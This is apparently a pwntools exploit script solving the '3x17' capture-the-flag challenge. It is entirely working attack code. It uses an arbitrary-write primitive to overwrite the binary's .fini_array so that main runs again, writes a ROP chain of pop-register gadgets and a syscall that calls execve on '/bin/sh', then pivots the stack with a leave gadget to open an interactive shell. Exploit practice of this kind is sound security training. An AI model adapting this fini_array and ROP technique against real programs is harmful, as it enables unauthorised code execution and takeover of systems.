from pwn import *
elf = context.binary = ELF("./3x17")
r = elf.process()

def write_data(address, data):
    r.sendlineafter(b"addr:", str(address))
    r.sendafter(b"data:", data)
    log.success(f"STATUS: OKE")

main = 0x401b6d
fini_array = 0x4b40f0
call_fini_function = 0x0402960 
pop_rdi = 0x0000000000401696 # /bin/sh
pop_rsi = 0x0000000000406c30 # 0
pop_rax = 0x000000000041e4af # 0x3b
pop_rdx = 0x0000000000446e35 # 0
syscall = 0x00000000004022b4 
binsh = fini_array + 8*11
leave = 0x0000000000401c4b

gdb.attach(r, '''
    b*0x401c4c\n
    c
''')

write_data(fini_array, p64(call_fini_function) + p64(main))
write_data(fini_array + 8*2, p64(pop_rdi) + p64(binsh))
write_data(fini_array + 8*4, p64(pop_rax) + p64(0x3b))
write_data(fini_array + 8*6, p64(pop_rsi) + p64(0x0))
write_data(fini_array + 8*8, p64(pop_rdx) + p64(0x0))
write_data(fini_array + 8*10, p64(syscall) + b"/bin/sh\0")
write_data(fini_array, p64(leave))

r.interactive()